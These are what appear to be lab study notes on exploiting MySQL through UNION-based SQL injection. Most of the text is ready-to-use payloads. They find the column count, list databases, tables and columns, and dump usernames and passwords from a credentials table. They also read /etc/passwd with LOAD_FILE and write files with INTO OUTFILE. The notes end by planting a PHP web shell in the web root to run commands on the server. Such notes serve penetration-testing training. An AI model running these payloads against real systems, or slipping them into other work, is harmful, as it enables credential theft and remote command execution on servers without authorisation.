## Detect number of columns
We need to find the number of columns selected by the server. There are two methods of detecting the number of columns:

- Using `ORDER BY`
- Using `UNION`
### Order By
```sql
' order by 1-- -
```
```sql
' order by 2-- -
```
- we increment repeatedly until we get an error
### Select
```sql
cn' UNION select 1,2,3-- -
```
```sql
cn' UNION select 1,2,3,4-- -
```
- Keep incrementing until we get a valid result
	- we can view which columns are being displayed from the number of the columns'

Now we can see the version:
```sql
cn' UNION select 1,@@version,3,4-- -
```
## Database Enumeration
The following queries and their output will tell us that we are dealing with `MySQL`:

| Payload            | When to Use                      | Expected Output                                     | Wrong Output                                              |
| ------------------ | -------------------------------- | --------------------------------------------------- | --------------------------------------------------------- |
| `SELECT @@version` | When we have full query output   | MySQL Version 'i.e. `10.3.22-MariaDB-1ubuntu1`'     | In MSSQL it returns MSSQL version. Error with other DBMS. |
| `SELECT POW(1,1)`  | When we only have numeric output | `1`                                                 | Error with other DBMS                                     |
| `SELECT SLEEP(5)`  | Blind/No Output                  | Delays page response for 5 seconds and returns `0`. | Will not delay response with other DBMS                   |
### INFORMATION_SCHEMA Database
To pull data from tables using `UNION SELECT`, we need to properly form our `SELECT` queries.

The [INFORMATION_SCHEMA](https://dev.mysql.com/doc/refman/8.0/en/information-schema-introduction.html) database contains metadata about the databases and tables present on the server.

To reference a table present in another DB, we can use the dot ‘`.`’ operator. For example, to `SELECT` a table `users` present in a database named `my_database`, we can use:
```sql
SELECT * FROM my_database.users;
```
### SCHEMATA
The table [SCHEMATA](https://dev.mysql.com/doc/refman/8.0/en/information-schema-schemata-table.html) in the `INFORMATION_SCHEMA` database contains information about all databases on the server.

The `SCHEMA_NAME` column contains all the database names currently present.
```sql
' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
```
- shows databases

We can find the current database with the `SELECT database()` query.
```sql
cn' UNION select 1,database(),2,3-- -
```
### TABLES
```sql
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
```
- shows all tables on the current database

### COLUMNS
```sql
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
```
- Dumps the data (column_name, table_name, table_schema) of the credentials table
### Data
```sql
cn' UNION select 1, username, password, 4 from dev.credentials-- -
```
- dumps data of the `username` and `password` columns from the `credentials` table in the `dev` database.
## Reading Files
### User Privileges
```sql
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -
```
- tests to see if we have super_priv
### LOAD_FILE
```sql
SELECT LOAD_FILE('/etc/passwd');
```
- Reads the contents of the passwd file
## Writing Files
To be able to write files to the back-end server using a MySQL database, we require three things:
1. User with `FILE` privilege enabled
2. MySQL global `secure_file_priv` variable not enabled
3. Write access to the location we want to write to on the back-end server
### secure_file_priv
Used to determine where to read/write files from. An empty value lets us read files from the entire file system. Otherwise, if a certain directory is set, we can only read from the folder specified by the variable.
- `NULL` means we cannot read/write from any directory

> Note: `MySQL` uses `/var/lib/mysql-files` as the default folder. This means that reading files through a `MySQL` injection isn't possible with default settings.

```sql
cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
```
### SELECT INTO OUTFILE
used to write data from select queries into files.

add `INTO OUTFILE '...'` after our query to export the results into the file we specified.

```sql
cn' UNION SELECT * from users INTO OUTFILE '/tmp/credentials'-- -
```
- saves the output of the `users` table into the `/tmp/credentials` file.
- If we go to the back-end server and `cat` the file, we see that table's content

It is also possible to directly `SELECT` strings into files
### Writing a Web Shell
**Note:** To write a web shell, we must know the base web directory for the web server (i.e. web root). One way to find it is to use `load_file` to read the server configuration, like Apache's configuration found at `/etc/apache2/apache2.conf`, Nginx's configuration at `/etc/nginx/nginx.conf`, or IIS configuration at `%WinDir%\System32\Inetsrv\Config\ApplicationHost.config`

We can write the following PHP webshell to be able to execute commands directly on the back-end server:
```php
<?php system($_REQUEST[0]); ?>
```

Injection may look like this:
```sql
cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
```
- This can be verified by browsing to the `/shell.php` file and executing commands by adding `?0=id` to the url